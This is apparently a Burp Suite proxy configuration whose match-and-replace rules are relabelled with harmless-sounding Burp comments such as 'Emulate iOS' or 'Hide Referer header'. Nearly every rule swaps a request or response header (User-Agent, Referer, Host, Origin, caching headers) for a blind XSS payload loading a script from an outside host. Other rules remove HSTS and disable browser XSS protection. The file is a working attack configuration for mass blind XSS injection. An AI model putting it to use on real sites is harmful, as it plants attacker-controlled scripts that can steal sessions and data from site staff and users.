{
    "proxy":{
        "match_replace_rules":[
            {
                "comment":"Emulate IE",
                "enabled":true,
                "is_simple_match":false,
                "rule_type":"request_header",
                "string_match":"^User-Agent.*$",
                "string_replace":"\"><script src=https://egy.xss.ht></script>"
            },
            {
                "comment":"Emulate iOS",
                "enabled":true,
                "is_simple_match":false,
                "rule_type":"request_header",
                "string_match":"^User-Agent.*$",
                "string_replace":"\"><script src=https://egy.xss.ht></script>"
            },
            {
                "comment":"Emulate Android",
                "enabled":true,
                "is_simple_match":false,
                "rule_type":"request_header",
                "string_match":"^User-Agent.*$",
                "string_replace":"\"><script src=https://egy.xss.ht></script>"
            },
            {
                "comment":"Require non-cached response",
                "enabled":true,
                "is_simple_match":false,
                "rule_type":"request_header",
                "string_match":"^If-Modified-Since.*$",
                "string_replace":"\"><script src=https://egy.xss.ht></script>"
            },
            {
                "comment":"Require non-cached response",
                "enabled":true,
                "is_simple_match":false,
                "rule_type":"request_header",
                "string_match":"^If-None-Match.*$",
                "string_replace":"\"><script src=https://egy.xss.ht></script>"
            },
            {
                "comment":"Hide Referer header",
                "enabled":true,
                "is_simple_match":false,
                "rule_type":"request_header",
                "string_match":"^Referer.*$",
                "string_replace":"\"><script src=https://egy.xss.ht></script>"
            },
            {
                "comment":"Require non-compressed responses",
                "enabled":true,
                "is_simple_match":false,
                "rule_type":"request_header",
                "string_match":"^Accept-Encoding.*$",
                "string_replace":"\"><script src=https://egy.xss.ht></script>"
            },
            {
                "comment":"Ignore cookies",
                "enabled":true,
                "is_simple_match":false,
                "rule_type":"response_header",
                "string_match":"^Set-Cookie.*$",
                "string_replace":"\"><script src=https://egy.xss.ht></script>"
            },
            {
                "comment":"Rewrite Host header",
                "enabled":true,
                "is_simple_match":false,
                "rule_type":"request_header",
                "string_match":"^Host: foo.example.org$",
                "string_replace":"Host: \"><script src=https://egy.xss.ht></script>"
            },
            {
                "comment":"Add spoofed CORS origin",
                "enabled":true,
                "is_simple_match":true,
                "rule_type":"request_header",
                "string_replace":"Origin: \"><script src=https://egy.xss.ht></script>"
            },
            {
                "comment":"Remove HSTS headers",
                "enabled":true,
                "is_simple_match":false,
                "rule_type":"response_header",
                "string_match":"^Strict\\-Transport\\-Security.*$",
                "string_replace":"\"><script src=https://egy.xss.ht></script>"
            },
            {
                "comment":"Disable browser XSS protection",
                "enabled":true,
                "is_simple_match":true,
                "rule_type":"response_header",
                "string_replace":"X-XSS-Protection: 0"
            },
            {
                "comment":"Blind XSS",
                "enabled":true,
                "is_simple_match":false,
                "rule_type":"request_header",
                "string_match":"^Referer.*$",
                "string_replace":"Referer:\"><script src=https://egy.xss.ht></script>"
            }
        ]
    }
}
